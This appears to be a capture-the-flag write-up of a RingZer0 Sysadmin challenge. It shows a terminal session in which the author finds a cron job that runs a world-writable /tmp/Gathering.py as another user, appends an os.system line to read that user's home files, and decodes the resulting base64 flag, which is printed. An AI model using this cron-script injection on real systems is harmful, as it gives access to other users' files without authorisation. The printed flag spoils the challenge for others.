root@iGenius138:~# ssh morpheus@challenges.ringzer0team.com -p 10147
morpheus@challenges.ringzer0team.com's password: 
 888888ba  oo                   d8888888P                    a8888a  d888888P                              
 88     8b                           .d8'                   d8    8b    88                                 
 88aaaa8P  dP 88d888b. .d8888b.    .d8'   .d8888b. 88d888b. 88  P 88    88    .d8888b. .d8888b. 88d8b.d8b. 
 88    8b. 88 88    88 88    88  .d8'     88ooood8 88    88 88 d  88    88    88ooood8 88    88 88  88  88 
 88     88 88 88    88 88    88 d8'       88.  ... 88       Y8    8P    88    88.  ... 88    88 88  88  88 
 dP     dP dP dP    dP `8888P88 Y8888888P `88888P' dP        Y8888P     dP    `88888P' `88888P8 dP  dP  dP 
oooooooooooooooooooooooo     88 ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                        d8888P                                                                             

                                    +---------------------------------+
                                    |  Welcome to the Sysadmin track  |
                                    |                                 |
                                    |   - Play nice and play Fair -   |
                                    |                                 |
                                    |----[ info@ringzer0team.com ]----|

The only thing we haven't touched, that is "backup folder" other files than oracle challenge.
morpheus@lxc-sysadmin:~$ cd /backup/
morpheus@lxc-sysadmin:/backup$ ls -ltra
total 76
-rw-r--r--  1 root root 10240 May 30  2018 ca584b15ae397a9ad45b1ff267b55796
-rw-r--r--  1 root root 20480 May 30  2018 c074fa6ec17bb35e168366c43cf4cd19
-rw-r--r--  1 root root 10240 May 30  2018 776d27d2a429e63bbc3cb29183417bb2
-rw-r--r--  1 root root 40960 May 30  2018 3dab3277410dddca016834f91d172027
drwxr-xr-x  2 root root  4096 May 30  2018 .
drwxr-xr-x 22 root root  4096 Sep 30 20:02 ..
morpheus@lxc-sysadmin:/backup$ cat 776d27d2a429e63bbc3cb29183417bb2 
tmp/0001773000000000000000000000000012310212034010341 5ustar  rootroottmp/Gathering.py0000777000175400017540000000006612310211034013512 0ustar  cyphercypherimport os
os.system("ps aux > /home/cypher/info.txt")
morpheus@lxc-sysadmin:/backup$ cat ca584b15ae397a9ad45b1ff267b55796 
var/spool/cron/0000755000000000000000000000000012303165400012433 5ustar  rootrootvar/spool/cron/atspool/0001770000000100000010000000000011764633605014675 5ustar  daemondaemonvar/spool/cron/crontabs/0001730000000000001460000000000012310210663014720 5ustar  rootcrontabvar/spool/cron/crontabs/cypher0000600000175400001460000000214612310210663016466 0ustar  cyphercrontab# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.f7mcQy/crontab installed on Wed Mar 12 22:02:27 2014)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/3 * * * * python /tmp/Gathering.py
var/spool/cron/atjobs/0001770000000100000010000000000012303165436014466 5ustar  daemondaemonvar/spool/cron/atjobs/.SEQ0000600000000100000010000000000212303165436015101 0ustar  daemondaemon0

Breaking down:
- user cypher is running a cron job every 3 minutes
- the code that cronjob runs is at /tmp/Gathering.py
- we cannot access to /tmp/Gathering.py nor edit it.
But, we can try echo some content into it.
After a few try, i have done listing all content inside /home/cypher/ folder:
morpheus@lxc-sysadmin:/backup$ echo "os.system('cat /home/cypher/* > /tmp/kenji')" >> /tmp/Gathering.py
morpheus@lxc-sysadmin:/tmp$ cat /tmp/Gathering.py
import os
os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
os.system('cat /home/cypher/* > /tmp/kenji')
morpheus@lxc-sysadmin:/tmp$ cat /tmp/kenji
cat: /tmp/kenji: No such file or directory
After 3 minutes ...
morpheus@lxc-sysadmin:/tmp$ cat /tmp/kenji
cat: /tmp/kenji: No such file or directory
morpheus@lxc-sysadmin:/tmp$ cat /tmp/kenji
BASE ?
RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==
morpheus@lxc-sysadmin:/tmp$ echo "RkxBRy0wY2ZjMzM5MGEwODJhMjJmZGQ3NjNmNDQyNmY0MzI5Ng==" | base64 -d
FLAG-0cfc3390a082a22fdd763f4426f43296

It's done for the 8th challenge of Syslinux admin !!!